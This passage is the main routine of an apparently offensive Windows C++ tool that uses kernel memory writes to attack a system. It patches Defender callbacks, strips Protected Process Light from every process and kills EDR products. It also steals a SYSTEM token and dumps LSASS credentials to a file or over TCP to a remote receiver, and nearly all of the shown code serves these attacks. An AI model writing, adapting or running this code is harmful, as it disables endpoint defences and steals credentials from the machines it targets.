        CleanupProvider(); return ret;
    }

    if (cfg.doListCallbacks) {
        if (!ListCallbacks(kb.ntosBase)) ret = 1;
    }

    if (cfg.doListProcs) {
        ListProcs(kb.systemEproc);
    }

    // Resolve LSASS PID for dump modes
    DWORD pid = cfg.targetPid;
    if (!pid && (cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
                 cfg.doDumpTcp || cfg.dryRun)) {
        pid = FindPidByName("lsass.exe");
        if (!pid) { printf("[-] Cannot find lsass.exe; use --pid\n"); CleanupProvider(); return 1; }
        printf("[*] LSASS PID: %lu\n", pid);
    }

    if (cfg.doPplStrip) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --ppl-strip requires --pid\n"); CleanupProvider(); return 2; }
        PplResult r = StripPpl(kb.systemEproc, tpid, false);
        if (!r.ok) ret = 1;
    }

    if (cfg.doPplAdd) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --ppl-add requires --pid\n"); CleanupProvider(); return 2; }
        if (!PplAdd(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.killEdr) {
        printf("[*] Patching ObCallbacks before EDR kill...\n");
        PatchObCallbacks(kb.ntosBase);
        // Walk EPROCESS list for PPL processes and strip all
        printf("[*] Stripping PPL from all running processes...\n");
        QWORD head  = kb.systemEproc + g_off.ActiveProcessLinks;
        QWORD flink = KReadQword(head);
        int stripped = 0;
        int guard = 0;
        while (flink && flink != head && guard++ < 10000) {
            QWORD ep = flink - g_off.ActiveProcessLinks;
            BYTE prot = 0;
            KRead(ep + g_off.Protection, &prot, 1);
            if (prot > 0) {
                char nm[16]{};
                KRead(ep + g_off.ImageFileName, nm, 15);
                BYTE zero = 0;
                if (KWrite(ep + g_off.Protection, &zero, 1)) {
                    BYTE verify = 0xFF; KRead(ep + g_off.Protection, &verify, 1);
                    printf("[+] PPL stripped: %-20s Protection 0x%02X -> 0x%02X\n", nm, prot, verify);
                    stripped++;
                }
            }
            flink = KReadQword(ep + g_off.ActiveProcessLinks);
        }
        printf("[*] %d PPL processes stripped\n", stripped);
        KillEdrs();
    }

    if (cfg.doKillPid) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --kill-pid requires --pid\n"); CleanupProvider(); return 2; }
        if (!KillSpecificPid(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.doPatchCallbacks) {
        printf("[*] Patching Defender ObCallback registrations...\n");
        if (!PatchObCallbacks(kb.ntosBase)) ret = 1;
    }

    if (cfg.doPrivEsc) {
        DWORD tpid = cfg.targetPid ? cfg.targetPid : GetCurrentProcessId();
        printf("[*] Stealing SYSTEM token for PID %lu%s\n",
               tpid, cfg.targetPid ? "" : " (self)");
        if (!TokenSteal(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.dryRun) {
        if (!pid) { printf("[-] --dry-run requires target PID\n"); CleanupProvider(); return 2; }
        PplResult r = StripPpl(kb.systemEproc, pid, true);
        if (!r.ok) ret = 1;
        else printf("\n[dry-run] OK. Run with --dump-rpm --out <path> to execute.\n");
    }

    if (cfg.doDump) {
        if (cfg.outPath.empty()) { printf("[-] --dump needs --out\n"); CleanupProvider(); return 2; }
        printf("[*] Auto-patching ObCallbacks for dump...\n");
        PatchObCallbacks(kb.ntosBase);
        // Read current protection state before clearing
        QWORD lsassEp = FindEprocessByPid(kb.systemEproc, pid, nullptr);
        BYTE savedProt = 0, savedSig = 0, savedSecSig = 0;
        if (lsassEp) {
            KRead(lsassEp + g_off.Protection - 2, &savedSig,    1);
            KRead(lsassEp + g_off.Protection - 1, &savedSecSig, 1);
            KRead(lsassEp + g_off.Protection,     &savedProt,   1);
        }
        PplResult r = StripPpl(kb.systemEproc, pid, false, true);
        if (!r.ok) { CleanupProvider(); return 1; }
        bool ok = DumpLsass(pid, cfg.outPath.c_str(), cfg.noXor, cfg.xorKey);
        // Restore protection
        if (lsassEp && savedProt) RestorePpl(lsassEp, savedProt, savedSig, savedSecSig);
        if (!ok) ret = 1;
    }

    if (cfg.doDumpRpm) {
        if (cfg.outPath.empty()) { printf("[-] --dump-rpm needs --out\n"); CleanupProvider(); return 2; }
        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        printf("[*] Auto-patching ObCallbacks for RPM dump...\n");
        PatchObCallbacks(kb.ntosBase);
        if (!DumpRpm(rpid, cfg.outPath.c_str())) ret = 1;
    }

    if (cfg.doDumpTcp) {
        if (cfg.recvIp.empty()) { printf("[-] --dump-tcp needs RECV_IP PORT\n"); CleanupProvider(); return 2; }
        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        printf("[*] Auto-patching ObCallbacks for TCP dump...\n");
        PatchObCallbacks(kb.ntosBase);
        if (!DumpRpmTcp(rpid, cfg.recvIp.c_str(), cfg.recvPort)) ret = 1;
    }

    if (cfg.doDumpKernel) {
        if (cfg.outPath.empty()) { printf("[-] --dump-kernel needs --out\n"); CleanupProvider(); return 2; }
        DWORD kpid = pid ? pid : FindPidByName("lsass.exe");
        if (!kpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        if (!DumpKernel(kb.systemEproc, kpid, cfg.outPath.c_str())) ret = 1;
    }

    CleanupProvider();
    return ret;
}
